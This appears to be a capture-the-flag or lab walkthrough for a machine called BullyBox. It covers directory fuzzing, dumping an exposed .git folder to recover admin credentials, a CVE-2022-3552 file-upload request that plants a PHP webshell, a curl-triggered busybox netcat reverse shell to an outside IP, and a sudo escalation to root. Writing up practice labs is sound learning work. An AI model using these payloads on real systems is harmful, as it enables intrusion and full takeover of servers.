#box

*Created: 1/5/2026*

### Step 1

**Tags:** #FFUF #Web-Enumeration #Web-Applications

**Command:**
```bash
# We use the quickhits.txt wordlist to discover the /bb-admin endpoint

ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://bullybox.local/FUZZ -c -ic -fc 403 -fs 3971
```

*Port: 80*

> 
> Initial Scan highlights the presence of port 80. After adding `busybox.local` to `/etc/hosts` we start a FFuF enumeration, discovering a `/bb-admin` endpoint which contains an authentication for the administrator user and an exposed `/.git` endpoint.

---

### Step 2

**Tags:** #git #git-dumper #Credentials-Leak #Credentials

🔗 **URL/Link:** https://github.com/arthaud/git-dumper

**Command:**
```bash
python3 git_dumper.py http://bullybox.local/ ./dump
```

*Port: 80*

> 
> We dump the `.git` folder with `git-dumper` and discover a password in the file `bb-config.php`. The usage of `git log` also shows us the owner of the changes, which is `admin@bullybox.local` which is our username to authenticate at `/bb-admin`
> 
> With the `git log` command the list of commits is shown. The author is also mentioned and in our case we discover that the author is a certain Yuki with an email of `admin@bullybox.local`
> 
```git
commit ccf7c701c4bd22484cbe5d9f8f92511261aadef0 (HEAD -> master)
Author: Yuki <admin@bullybox.local>
Date:   Tue Jun 27 04:35:12 2023 +0000

    Ready For launch
```
> 
> With the password found in `bb-config.php` we tried to authenticate at http://bullybox.local/bb-admin, succeeding

---

### Step 3

**Tags:** #Arbitrary-File-Upload #Web-Applications

🔗 **URL/Link:** https://www.exploit-db.com/papers/51108

**Command:**
```http
POST /bb-admin/index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: bullybox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=76fbl249p0m0u5cv4qtopq2i91
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

order_id=1&path=shell.php&data=<%3fphp+system($_REQUEST["cmd"])%3b++%3f>
```

*Port: 80*

> 
> Once authenticated, [CVE-2022-3552](https://www.exploit-db.com/papers/51108) is a nice entry point to obtain a foothold onto the machine. For ease, we intercept a call in BurpSuite and proceed to adjust the API to resemble the one mentioned in the CVE

---

### Step 4

**Tags:** #RCE #Reverse-Shell #Shells #Web-Applications

**Command:**
```bash
curl --data-urlencode "cmd=busybox nc 192.168.45.245 22 -e /bin/bash" http://bullybox.local/shell.php
```

*Port: 80*

> 
> Finally, by having uploaded the webshell, we can finally gain a reverse shell through cURL. We'll land on the system with an user that belongs to the group `sudo`. Doing `sudo  -l` will show that we can run everything as sudo. At this point `sudo su` grants us a root shell.

---

